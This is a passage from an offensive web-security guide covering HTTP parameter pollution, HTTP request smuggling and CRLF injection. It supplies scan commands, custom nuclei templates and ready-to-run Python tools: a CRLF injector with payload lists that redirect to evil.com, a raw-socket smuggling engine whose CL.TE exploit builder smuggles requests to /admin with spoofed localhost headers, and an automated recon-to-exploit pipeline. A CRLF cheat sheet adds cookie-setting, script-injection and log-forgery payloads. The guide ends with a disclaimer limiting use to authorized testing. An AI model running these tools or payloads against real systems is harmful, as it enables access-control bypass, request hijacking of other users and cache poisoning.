       -t http/vulnerabilities/ \
       -o nuclei_results.txt

# ── Only high/critical severity ───────────────────────────────────
nuclei -l targets.txt \
       -t http/vulnerabilities/ \
       -severity high,critical

# ── With rate limiting (safe for bug bounty) ──────────────────────
nuclei -l targets.txt \
       -t http/vulnerabilities/http-request-smuggling/ \
       -rate-limit 5 \
       -timeout 20 \
       -retries 1

# ── JSON output for automation ────────────────────────────────────
nuclei -l targets.txt \
       -t http/vulnerabilities/ \
       -json \
       -o nuclei_results.json

# ── Debug: show requests/responses ───────────────────────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/http-request-smuggling/ \
       -debug-req -debug-resp \
       -v

# ── Use custom templates directory ────────────────────────────────
nuclei -u "https://target.com" \
       -t ~/custom-nuclei-templates/

# ── Exclude templates ────────────────────────────────────────────
nuclei -l targets.txt \
       -t http/vulnerabilities/ \
       -exclude-tags "dos,timing" \
       -o results.txt

# ── Interactsh integration (for out-of-band detection) ────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/ \
       -iserver https://oast.pro

# ── Proxy through Burp ────────────────────────────────────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/http-request-smuggling/ \
       -proxy "http://127.0.0.1:8080"

# ── Full pipeline: katana crawl → nuclei scan ────────────────────
katana -u "https://target.com" -depth 2 -silent | \
  httpx -silent -status-code -mc 200 | \
  awk '{print $1}' | \
  nuclei -t http/vulnerabilities/ -rate-limit 3 -o results.txt
```

### Custom Nuclei Templates

```yaml
# custom-hpp-role-escalation.yaml
id: hpp-role-escalation

info:
  name: HTTP Parameter Pollution - Role Escalation
  severity: high
  tags: hpp,logic,escalation

http:
  - method: GET
    path:
      - "{{BaseURL}}?role=user&role=admin"
      - "{{BaseURL}}?role=admin&role=user"
      - "{{BaseURL}}?admin=0&admin=1"
      - "{{BaseURL}}?type=user&type=admin"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Admin Panel"
          - "Delete User"
          - "Manage Users"
          - "Admin Dashboard"
          - "administration"
        case-insensitive: true
      - type: status
        status:
          - 200
        # Only interesting if previously got 403 on /admin
```

```yaml
# custom-crlf-response-split.yaml
id: crlf-response-splitting

info:
  name: CRLF Injection - Response Splitting
  severity: high
  description: |
    Tests for CRLF injection that could enable HTTP response splitting,
    cookie injection, XSS, or cache poisoning.
  tags: crlf,injection,response-splitting

variables:
  marker: "crlftest{{randstr}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}?url=https://safe.com%0d%0aX-Injected: {{marker}}"
      - "{{BaseURL}}?redirect=https://safe.com%0aX-Injected: {{marker}}"
      - "{{BaseURL}}?lang=en%0d%0aX-Injected: {{marker}}"
      - "{{BaseURL}}?next=/%0d%0aX-Injected: {{marker}}"
      - "{{BaseURL}}?ref=test%0D%0AX-Injected: {{marker}}"

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "X-Injected: {{marker}}"
        name: crlf-confirmed

    extractors:
      - type: kval
        part: header
        kval:
          - x-injected
```

```yaml
# custom-hrs-clte-detect.yaml
id: hrs-clte-detection

info:
  name: HTTP Request Smuggling - CL.TE Detection
  severity: critical
  description: |
    Sends a CL.TE timing probe. A delayed response (>5s) suggests
    the back-end is waiting for chunked data that the front-end
    already consumed — indicating CL.TE desync.
  tags: hrs,smuggling,clte,timing

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4
        Transfer-Encoding: chunked
        
        1
        A
        X

    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
        name: timing-anomaly-5s

    extractors:
      - type: dsl
        name: response-duration
        dsl:
          - "duration"
```

---

## 6.12 Custom Python Scripts — Complete Library

### Script 1: CRLF Injection Tester

```python
#!/usr/bin/env python3
"""
crlf_tester.py — Comprehensive CRLF injection tester
Tests headers, cookies, log injection, response splitting.
Usage: python3 crlf_tester.py -u https://target.com
"""

import requests
import argparse
import urllib.parse
import sys
from colorama import Fore, Style, init

init(autoreset=True)

import urllib3
urllib3.disable_warnings()

CRLF_PAYLOADS = [
    # Standard
    "%0d%0a",
    "%0a",
    "%0D%0A",
    # Double encoded
    "%250d%250a",
    "%250a",
    # Unicode
    "%u000d%u000a",
    "\\r\\n",
    # Multi-byte
    "%E5%98%8A%E5%98%8D",
    # With space
    "%0d%0a%20",
    "%0d%0a%09",
    # Hash/question
    "%23%0d%0a",
    "%3f%0d%0a",
    # Combinations
    "%0d%0a%0d%0a",
    "\r\n",
]

INJECTION_SUFFIXES = [
    "X-CRLF-Test: crlf_injected",
    "Set-Cookie: crlf_test=1; Path=/",
    "Location: https://evil.com",
    "Content-Type: text/html\r\n\r\n<h1>CRLF Split</h1>",
]

INJECTABLE_PARAMS = [
    "redirect", "redirect_uri", "redirect_url",
    "url", "next", "return", "return_url",
    "ref", "referrer", "callback",
    "lang", "language", "locale",
    "page", "path", "location", "dest", "destination",
    "q", "search", "query",
    "host", "domain",
]

class CRLFTester:

    def __init__(self, url, cookies=None, proxy=None, timeout=10):
        self.base_url = url
        self.session = requests.Session()
        self.session.verify = False
        self.session.max_redirects = 0
        if cookies:
            for pair in cookies.split(';'):
                if '=' in pair:
                    k, v = pair.strip().split('=', 1)
                    self.session.cookies.set(k, v)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.timeout = timeout
        self.findings = []

    def test_param(self, param, crlf, suffix):
        """Inject CRLF into a URL parameter and check response headers"""
        payload = f"https://safe.com{crlf}{suffix}"
        test_url = f"{self.base_url}?{param}={urllib.parse.quote(payload, safe='')}"

        try:
            resp = self.session.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=False,
            )
            # Check if injected header appears in response headers
            for header_name, header_val in resp.headers.items():
                if "crlf_injected" in header_val.lower() or \
                   "crlf_test" in header_name.lower() or \
                   "evil.com" in header_val.lower():
                    return True, resp.status_code, \
                           f"{header_name}: {header_val}"
        except requests.exceptions.TooManyRedirects:
            # Sometimes CRLF triggers a redirect loop
            return False, "redirect", None
        except Exception:
            pass

        return False, None, None

    def run(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  CRLF INJECTION TESTER — {self.base_url}")
        print(f"{'='*60}{Style.RESET_ALL}")

        for param in INJECTABLE_PARAMS:
            for crlf in CRLF_PAYLOADS:
                for suffix in INJECTION_SUFFIXES:
                    vuln, status, evidence = self.test_param(param, crlf, suffix)
                    if vuln:
                        msg = (f"\n{Fore.RED}[!!!] CRLF INJECTION CONFIRMED!\n"
                               f"      Param:   {param}\n"
                               f"      Payload: {crlf}\n"
                               f"      Suffix:  {suffix}\n"
                               f"      Status:  {status}\n"
                               f"      Evidence: {evidence}{Style.RESET_ALL}")
                        print(msg)
                        self.findings.append({
                            "param": param,
                            "crlf": crlf,
                            "suffix": suffix,
                            "status": status,
                            "evidence": evidence,
                        })
                    else:
                        if "--verbose" in sys.argv:
                            print(f"  [-] {param} + {crlf[:10]} → no injection")

        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  FINDINGS: {len(self.findings)}")
        print(f"{'='*60}{Style.RESET_ALL}")
        return self.findings


def main():
    parser = argparse.ArgumentParser(description="CRLF Injection Tester")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--cookies", default=None)
    parser.add_argument("--proxy", default=None)
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    tester = CRLFTester(args.url, args.cookies, args.proxy)
    tester.run()


if __name__ == "__main__":
    main()
```

### Script 2: HRS Raw Socket Engine

```python
#!/usr/bin/env python3
"""
hrs_engine.py — Low-level HRS detection + exploitation engine
Sends raw bytes with precise CRLF control for accurate testing.
Usage: python3 hrs_engine.py -u https://target.com
"""

import socket
import ssl
import time
import sys
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

class HRSEngine:
    """
    All HTTP requests built byte-by-byte with explicit \r\n.
    This is crucial: wrong CRLF = request rejected or not smuggled.
    """

    def __init__(self, host, port=443, use_ssl=True, timeout=15):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout

    # ── Raw connection ─────────────────────────────────────────────

    def connect(self):
        sock = socket.create_connection((self.host, self.port),
                                        timeout=self.timeout)
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def send_recv(self, payload_bytes, label=""):
        """Send bytes, receive response, return (response_str, elapsed_sec)"""
        start = time.time()
        try:
            sock = self.connect()
            sock.sendall(payload_bytes)
            buf = b""
            sock.settimeout(self.timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    if b"\r\n\r\n" in buf and len(buf) > 300:
                        break
            except socket.timeout:
                pass
            sock.close()
            elapsed = time.time() - start
            return buf.decode("utf-8", errors="replace"), elapsed
        except Exception as e:
            return f"ERROR: {e}", time.time() - start

    # ── Request builders (explicit \r\n everywhere) ────────────────

    def build_clte_timing(self):
        """
        CL.TE timing probe — explained byte by byte:

        POST / HTTP/1.1\r\n           ← request line
        Host: target\r\n              ← required Host header
        Content-Length: 4\r\n         ← front-end reads 4 bytes of body
        Transfer-Encoding: chunked\r\n← back-end uses TE (chunked)
        \r\n                          ← blank line = end of headers

        [BODY — 4 bytes as seen by front-end]
        1\r\n                         ← chunk size = 1 (hex)  [byte 1-2 = "1\r"]
        A\r\n                         ← chunk data "A"        [byte 3-4 = "\nA"]
        X                             ← NOT a valid chunk size!

        Front-end sees CL=4 → reads exactly "1\r\nA" (4 bytes) → sends to backend
        Back-end sees TE:chunked → reads chunk "1" = 1 byte "A" → OK
        Back-end now expects next chunk size → reads "X" → NOT valid hex!
        Back-end HANGS waiting for valid chunk terminator
        → Response timeout = CL.TE confirmed!
        """
        return (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 4\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"           # ← END OF HEADERS (double CRLF total)
            b"1\r\n"          # ← chunk size = 1 byte
            b"A\r\n"          # ← 1 byte of data
            b"X"              # ← invalid chunk size → backend hangs
        )

    def build_tecl_timing(self):
        """
        TE.CL timing probe — explained:

        Content-Length: 6\r\n    ← back-end reads 6 bytes of body
        Transfer-Encoding: chunked\r\n ← front-end uses TE

        Body:
        0\r\n     ← chunk terminator (front-end: "end of body!")  [3 bytes]
        \r\n      ← blank line after terminal chunk               [2 bytes]
        X         ← extra byte                                    [1 byte]
                    TOTAL = 6 bytes → matches CL

        Front-end: TE → sees "0" terminator → sends to back-end ✓
        Back-end: CL=6 → reads "0\r\n\r\nX" = 6 bytes → still wants more?
        Wait: back-end reads CL=6 from the body perspective:
          It sees body = "0\r\n\r\nX" and processes as raw body
          It's WAITING for more bytes to fulfill CL=6
          But front-end already forwarded all 6 bytes...
        → Ambiguity → back-end hangs → timeout = TE.CL!
        """
        return (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 6\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"           # ← END OF HEADERS
            b"0\r\n"          # ← terminal chunk [3 bytes]
            b"\r\n"           # ← blank line after terminal chunk [2 bytes]
            b"X"              # ← extra byte [1 byte] → CL=6 satisfied
        )

    def build_clte_exploit(self, smuggled_path="/admin",
                            smuggled_host="localhost"):
        """
        CL.TE exploit — smuggle an admin request:

        Body structure:
        [terminal chunk "0\r\n\r\n"] + [smuggled request]

        Content-Length covers the ENTIRE body (chunk + smuggled request)
        Transfer-Encoding: chunked → front-end stops at "0" terminator
        Back-end has leftover: entire smuggled request prefix

        When next user's request arrives → it gets APPENDED to our smuggled prefix
        → Back-end processes: [our smuggled GET /admin] + [user's body]
        """
        smuggled = (
            f"GET {smuggled_path} HTTP/1.1\r\n"
            f"Host: {smuggled_host}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"X-Real-IP: 127.0.0.1\r\n"
            f"Content-Length: 10\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"smuggled=1"
        ).encode()

        # Terminal chunk + blank line + smuggled request
        body = b"0\r\n\r\n" + smuggled
        cl = len(body)

        return (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(cl).encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"           # ← END OF HEADERS
            + body            # ← 0\r\n\r\n + smuggled request
        )

    def build_tete_probe(self, obfuscation="Transfer-Encoding: xchunked"):
        """
        TE.TE probe — uses obfuscated second TE header:

        Two TE headers are sent:
          Transfer-Encoding: chunked      ← front-end recognizes → uses TE
          Transfer-Encoding: xchunked     ← back-end doesn't know "xchunked"
                                            → ignores TE → falls back to CL

        Result: front-end uses TE, back-end uses CL → same as TE.CL
        Timing probe body: "0\r\n\r\nX" with CL=6
        """
        return (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 6\r\n"
            b"Transfer-Encoding: chunked\r\n"
            + obfuscation.encode() + b"\r\n"   # ← second TE (obfuscated)
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"X"
        )

    def build_normal(self, path="/"):
        return (
            b"GET " + path.encode() + b" HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Connection: close\r\n"
            b"\r\n"
        )

    def _status(self, resp):
        line = resp.split("\n")[0] if resp else ""
        parts = line.split()
        return parts[1] if len(parts) >= 2 else "?"

    # ── Test runners ───────────────────────────────────────────────

    def test_clte(self):
        print(f"\n{Fore.YELLOW}[CL.TE Timing Probe]{Style.RESET_ALL}")
        print("  Sending CL=4, TE=chunked, body ends with invalid chunk 'X'")
        print("  If back-end hangs waiting for valid chunk → TIMEOUT = vulnerable")

        payload = self.build_clte_timing()
        resp, elapsed = self.send_recv(payload, "CLTE-timing")

        print(f"  Response time: {elapsed:.2f}s")
        if elapsed >= 5:
            print(f"{Fore.RED}  [!!!] CL.TE TIMING ANOMALY ({elapsed:.1f}s) — POTENTIAL VULNERABILITY!{Style.RESET_ALL}")
            return "CL.TE"
        print("  [-] No CL.TE timing anomaly")
        return None

    def test_tecl(self):
        print(f"\n{Fore.YELLOW}[TE.CL Timing Probe]{Style.RESET_ALL}")
        print("  Sending CL=6, TE=chunked, body = '0\\r\\n\\r\\nX'")
        print("  If back-end hangs waiting for CL bytes → TIMEOUT = vulnerable")

        payload = self.build_tecl_timing()
        resp, elapsed = self.send_recv(payload, "TECL-timing")

        print(f"  Response time: {elapsed:.2f}s")
        if elapsed >= 5:
            print(f"{Fore.RED}  [!!!] TE.CL TIMING ANOMALY ({elapsed:.1f}s) — POTENTIAL VULNERABILITY!{Style.RESET_ALL}")
            return "TE.CL"
        print("  [-] No TE.CL timing anomaly")
        return None

    def test_tete(self):
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: x-chunked",
            "Transfer-Encoding: chunked, dav",
            "Transfer-Encoding: CHUNKED",
            " Transfer-Encoding: chunked",
            "Transfer-Encoding:chunked",
            "X-Transfer-Encoding: chunked",
        ]

        print(f"\n{Fore.YELLOW}[TE.TE Obfuscation Probes]{Style.RESET_ALL}")
        for ob in obfuscations:
            print(f"  Trying: {ob.strip()!r}")
            payload = self.build_tete_probe(ob)
            resp, elapsed = self.send_recv(payload)
            print(f"    Time: {elapsed:.2f}s", end="")
            if elapsed >= 5:
                print(f" {Fore.RED}← TIMEOUT! TE.TE via this obfuscation!{Style.RESET_ALL}")
                return "TE.TE", ob
            print()
        return None, None

    def test_differential(self):
        print(f"\n{Fore.YELLOW}[Differential Response Test]{Style.RESET_ALL}")
        print("  1. Baseline: GET /")

        baseline_resp, _ = self.send_recv(self.build_normal("/"))
        baseline_status = self._status(baseline_resp)
        print(f"     Status: {baseline_status}")

        print("  2. Send CL.TE probe with smuggled GET /NONEXISTENT_PATH_12345")
        probe = self.build_clte_exploit("/NONEXISTENT_PATH_12345", self.host)
        _, _ = self.send_recv(probe)

        print("  3. Follow-up GET / (should be poisoned)")
        check_resp, _ = self.send_recv(self.build_normal("/"))
        check_status = self._status(check_resp)
        print(f"     Status: {check_status}")

        if check_status == "404" and baseline_status != "404":
            print(f"{Fore.RED}  [!!!] DIFFERENTIAL CONFIRMED! "
                  f"Baseline {baseline_status} → Poisoned {check_status}{Style.RESET_ALL}")
            return True
        print("  [-] No differential detected")
        return False

    def run_all(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  HRS ENGINE — {self.host}:{self.port}")
        print(f"{'='*60}{Style.RESET_ALL}")

        findings = []
        t = self.test_clte()
        if t:
            findings.append(t)
        t = self.test_tecl()
        if t:
            findings.append(t)
        t, ob = self.test_tete()
        if t:
            findings.append(f"{t} via {ob}")
        confirmed = self.test_differential()
        if confirmed:
            findings.append("CL.TE (differential confirmed)")

        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  SUMMARY: {len(findings)} finding(s)")
        for f in findings:
            print(f"  → {f}")
        print(f"{'='*60}{Style.RESET_ALL}")
        return findings


def main():
    p = argparse.ArgumentParser(description="HRS Engine")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-t", "--timeout", type=int, default=15)
    args = p.parse_args()

    from urllib.parse import urlparse
    parsed = urlparse(args.url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"

    engine = HRSEngine(host, port, use_ssl, args.timeout)
    engine.run_all()

if __name__ == "__main__":
    main()
```

### Script 3: Full Pipeline Orchestrator

```python
#!/usr/bin/env python3
"""
full_pipeline.py — Complete automated HPP + HRS + CRLF pipeline
Usage: python3 full_pipeline.py -t target.com
"""

import subprocess
import sys
import os
import json
import argparse
from datetime import datetime
from pathlib import Path

class Pipeline:

    def __init__(self, target, out_dir=None, proxy=None):
        self.target = target
        self.base_url = f"https://{target}"
        self.proxy = proxy
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.out = Path(out_dir or f"pipeline_{target}_{ts}")
        (self.out / "recon").mkdir(parents=True, exist_ok=True)
        (self.out / "hpp").mkdir(exist_ok=True)
        (self.out / "hrs").mkdir(exist_ok=True)
        (self.out / "crlf").mkdir(exist_ok=True)
        (self.out / "reports").mkdir(exist_ok=True)
        self.vulns = []

    def run(self, cmd, label=""):
        """Run a shell command, return stdout"""
        print(f"  [>] {label or cmd[:60]}")
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=300)
            return r.stdout + r.stderr
        except subprocess.TimeoutExpired:
            return "TIMEOUT"
        except Exception as e:
            return f"ERROR: {e}"

    def log_vuln(self, msg):
        self.vulns.append(msg)
        print(f"\n{'!'*60}")
        print(f"  [VULNERABILITY] {msg}")
        print(f"{'!'*60}\n")

    # ── Phase 1: Recon ─────────────────────────────────────────────

    def phase_recon(self):
        print(f"\n{'='*60}\n  PHASE 1: RECON\n{'='*60}")

        # Collect URLs
        gau = self.run(
            f"gau {self.target} 2>/dev/null | "
            f"grep -v '\\.\\(jpg\\|png\\|css\\|gif\\|ico\\)$' | sort -u",
            "gau URL collection"
        )
        url_file = self.out / "recon" / "all_urls.txt"
        url_file.write_text(gau)
        print(f"  URLs collected: {gau.count(chr(10))}")

        # httpx probe
        self.run(
            f"cat {url_file} | httpx -silent -json "
            f"-status-code -web-server -tech-detect -http2 "
            f"-include-response-header "
            f"-o {self.out}/recon/httpx.json 2>/dev/null",
            "httpx probing"
        )

        # Score HRS candidates
        candidates = self._score_hrs_candidates()
        cand_file = self.out / "recon" / "hrs_candidates.txt"
        cand_file.write_text("\n".join(candidates))
        print(f"  HRS candidates: {len(candidates)}")

        # CRLFuzz
        self.run(
            f"crlfuzz -l {url_file} -s -c 15 "
            f"-o {self.out}/crlf/crlfuzz_results.txt 2>/dev/null",
            "CRLFuzz scan"
        )
        crlf_file = self.out / "crlf" / "crlfuzz_results.txt"
        if crlf_file.exists() and crlf_file.stat().st_size > 0:
            self.log_vuln(f"CRLF Injection found — see {crlf_file}")

    def _score_hrs_candidates(self):
        proxy_signals = ['via', 'x-served-by', 'cf-ray', 'x-cache',
                         'x-amz-cf', 'x-varnish', 'fastly']
        candidates = []
        httpx_file = self.out / "recon" / "httpx.json"
        if not httpx_file.exists():
            return [self.base_url]
        for line in httpx_file.read_text().splitlines():
            try:
                d = json.loads(line)
                headers = {k.lower(): v.lower()
                           for k, v in (d.get("headers") or {}).items()}
                score = 0
                for sig in proxy_signals:
                    if any(sig in h for h in headers):
                        score += 2
                if d.get("http2"):
                    score += 2
                if score > 0:
                    candidates.append(d.get("url", ""))
            except Exception:
                pass
        return candidates or [self.base_url]

    # ── Phase 2: HPP ───────────────────────────────────────────────

    def phase_hpp(self):
        print(f"\n{'='*60}\n  PHASE 2: HPP TESTING\n{'='*60}")

        # Arjun parameter discovery
        arjun_out = self.out / "hpp" / "arjun.json"
        self.run(
            f"python3 -m arjun -u {self.base_url}/ "
            f"-m GET -q -o {arjun_out} 2>/dev/null",
            "Arjun parameter discovery"
        )

        # ffuf HPP fuzzing on critical params
        crit_params = ["role", "admin", "status", "price", "redirect", "type"]
        for param in crit_params:
            self.run(
                f"ffuf -u '{self.base_url}/?{param}=user&{param}=FUZZ' "
                f"-w ~/wordlists/hpp_values.txt "
                f"-mc 200 -fc 404 -s "
                f"-o {self.out}/hpp/ffuf_{param}.json -of json 2>/dev/null",
                f"ffuf HPP: {param}"
            )

        # Nuclei HPP templates
        self.run(
            f"nuclei -u {self.base_url} "
            f"-t ~/custom-nuclei-templates/hpp-detection.yaml "
            f"-silent -o {self.out}/hpp/nuclei_hpp.txt 2>/dev/null",
            "nuclei HPP"
        )
        nuclei_hpp = self.out / "hpp" / "nuclei_hpp.txt"
        if nuclei_hpp.exists() and nuclei_hpp.stat().st_size > 0:
            self.log_vuln(f"HPP via nuclei — {nuclei_hpp}")

    # ── Phase 3: HRS ───────────────────────────────────────────────

    def phase_hrs(self):
        print(f"\n{'='*60}\n  PHASE 3: HRS TESTING\n{'='*60}")

        cand_file = self.out / "recon" / "hrs_candidates.txt"
        if not cand_file.exists():
            cand_file.write_text(self.base_url)

        for url in cand_file.read_text().splitlines():
            if not url.strip():
                continue
            slug = abs(hash(url)) % 100000

            # smuggler.py
            out_f = self.out / "hrs" / f"smuggler_{slug}.txt"
            self.run(
                f"timeout 90 python3 ~/sec-tools/smuggler/smuggler.py "
                f"-u {url} -t 12 -o {out_f} 2>/dev/null",
                f"smuggler.py → {url[:50]}"
            )
            if out_f.exists():
                content = out_f.read_text().lower()
                if "potential" in content or "vulnerable" in content:
                    self.log_vuln(f"HRS (smuggler.py) at {url} — {out_f}")

            # h2csmuggler
            h2c_out = self.out / "hrs" / f"h2c_{slug}.txt"
            result = self.run(
                f"timeout 30 python3 ~/sec-tools/h2csmuggler/h2csmuggler.py "
                f"--test {url} 2>/dev/null",
                f"h2csmuggler → {url[:50]}"
            )
            h2c_out.write_text(result)
            if "accepted" in result.lower():
                self.log_vuln(f"H2C Smuggling at {url}")

            # nuclei HRS
            n_out = self.out / "hrs" / f"nuclei_{slug}.txt"
            self.run(
                f"nuclei -u {url} "
                f"-t http/vulnerabilities/http-request-smuggling/ "
                f"-silent -rate-limit 3 -o {n_out} 2>/dev/null",
                f"nuclei HRS → {url[:50]}"
            )
            if n_out.exists() and n_out.stat().st_size > 0:
                self.log_vuln(f"HRS (nuclei) at {url} — {n_out}")

    # ── Phase 4: Report ────────────────────────────────────────────

    def phase_report(self):
        print(f"\n{'='*60}\n  PHASE 4: REPORT\n{'='*60}")

        report = f"""# Security Pipeline Report
## Target: {self.target}
## Date: {datetime.now().isoformat()}

## Vulnerabilities Found: {len(self.vulns)}

"""
        for v in self.vulns:
            report += f"- {v}\n"

        report += f"""

## Files
- Recon:  {self.out}/recon/
- HPP:    {self.out}/hpp/
- HRS:    {self.out}/hrs/
- CRLF:   {self.out}/crlf/

## Manual Next Steps
1. Confirm HRS with Burp Suite differential response
2. Escalate CRLF to XSS or session fixation
3. Verify HPP with actual business impact
4. Document PoC steps
"""
        report_path = self.out / "reports" / "REPORT.md"
        report_path.write_text(report)
        print(f"  Report: {report_path}")
        print(f"  Vulnerabilities: {len(self.vulns)}")

    def run_all(self):
        print(f"\n{'#'*60}")
        print(f"  FULL PIPELINE — {self.target}")
        print(f"  Output: {self.out}/")
        print(f"{'#'*60}")
        self.phase_recon()
        self.phase_hpp()
        self.phase_hrs()
        self.phase_report()
        print(f"\n[+] Pipeline complete. Output: {self.out}/")


def main():
    p = argparse.ArgumentParser(description="Full Security Pipeline")
    p.add_argument("-t", "--target", required=True, help="Target domain")
    p.add_argument("-o", "--output", default=None, help="Output directory")
    p.add_argument("--proxy", default=None, help="Proxy URL")
    args = p.parse_args()

    Pipeline(args.target, args.output, args.proxy).run_all()

if __name__ == "__main__":
    main()
```

---

## 6.13 CRLF Quick Reference

### Payload Encoding Table

```
══════════════════════════════════════════════════════════════
         CRLF PAYLOAD ENCODING CHEAT SHEET
══════════════════════════════════════════════════════════════

CONTEXT               PAYLOAD
──────────────────────────────────────────────────────────────
URL parameter         %0d%0aHeader: value
                      %0aHeader: value
                      %0D%0AHeader: value
Double encoded        %250d%250aHeader: value
Unicode               %u000d%u000aHeader: value
Java/JSON escape      \u000d\u000aHeader: value
Multi-byte            %E5%98%8A%E5%98%8D (looks like \n\r)
With hash             %23%0d%0aHeader: value  (after # = fragment)
With question         %3f%0d%0aHeader: value  (after ? = new param)

COMMON INJECTION TARGETS
──────────────────────────────────────────────────────────────
Response header inject:  %0d%0aX-Custom: injected
Cookie set:             %0d%0aSet-Cookie: admin=1; Path=/
Redirect inject:        %0d%0aLocation: https://evil.com
XSS via content-type:   %0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
Log inject:             %0d%0a[FAKE LOG ENTRY] GET /admin 200
Response split:         %0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...

HOW TO CONFIRM
──────────────────────────────────────────────────────────────
1. Inject: ?param=value%0d%0aX-Test:%20confirmed
2. Check response headers for: X-Test: confirmed
3. If present → CRLF injection confirmed!
══════════════════════════════════════════════════════════════
```

### HTTP Indentation Rules Recap

```
══════════════════════════════════════════════════════════════
      HTTP INDENTATION & CRLF STRUCTURE — MASTER REFERENCE
══════════════════════════════════════════════════════════════

[REQUEST LINE]    verb SP path SP version CRLF
[HEADER]          name COLON SP value CRLF
[HEADER]          name COLON SP value CRLF
    [FOLD]            SP or HT continuation-value CRLF  ← OBSOLETE
[BLANK LINE]      CRLF  (just \r\n, no content)
[BODY]            raw bytes (for POST/PUT)

[CHUNKED BODY]
  hex-size CRLF       ← chunk size in hex
  chunk-data CRLF     ← that many bytes
  hex-size CRLF       ← next chunk
  chunk-data CRLF
  0 CRLF              ← terminal chunk
  CRLF                ← mandatory blank line after terminal

CRITICAL BYTES:
  Every \r\n = 0x0D 0x0A (2 bytes)
  Blank line = 0x0D 0x0A 0x0D 0x0A (4 bytes)
  Terminal chunk = 0x30 0x0D 0x0A 0x0D 0x0A (5 bytes: "0\r\n\r\n")

COMMON MISTAKES IN SMUGGLING PAYLOADS:
  ✗ Missing \r\n after chunk data → back-end rejects
  ✗ Missing blank line after "0" → back-end waits for it
  ✗ Extra \r\n in wrong place → request malformed
  ✗ CL counts wrong → smuggled bytes cut off or too long
══════════════════════════════════════════════════════════════
```

---

## 6.14 Tool Comparison Matrix

| Tool | HPP | HRS CL.TE | HRS TE.CL | TE.TE | H2C | CRLF | Auto |
|------|:---:|:---------:|:---------:|:-----:|:---:|:----:|:----:|
| smuggler.py | — | ✅ | ✅ | ✅ | — | — | Partial |
| HTTP Req Smuggler (Burp) | — | ✅ | ✅ | ✅ | ✅ | — | ✅ |
| h2csmuggler | — | — | — | — | ✅ | — | Partial |
| crlfuzz | — | — | — | — | — | ✅ | ✅ |
| nuclei | Partial | ✅ | ✅ | — | — | ✅ | ✅ |
| Arjun | ✅ | — | — | — | — | — | ✅ |
| ffuf | ✅ | — | — | — | — | ✅ | ✅ |
| httpx | (recon) | — | — | — | — | — | ✅ |
| hrs_engine.py | — | ✅ | ✅ | ✅ | — | — | — |
| crlf_tester.py | — | — | — | — | — | ✅ | ✅ |
| h2c_raw_detector.py | — | — | — | — | ✅ | ✅ | — |
| full_pipeline.py | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

---

> **⚠️ Legal Disclaimer:** All tools, scripts, and techniques described here are for authorized security testing and educational purposes only. Always obtain written permission before testing any system. Unauthorized testing is illegal. The author bears no responsibility for misuse.

---

*Guide Version: 3.0 | Covers: HPP · HRS (CL.TE, TE.CL, TE.TE, H2) · CRLF Injection · Full Automation*
*References: PortSwigger Research · OWASP · Real-World Bug Hunting · Bug Bounty Bootcamp · James Kettle DEF CON 27*
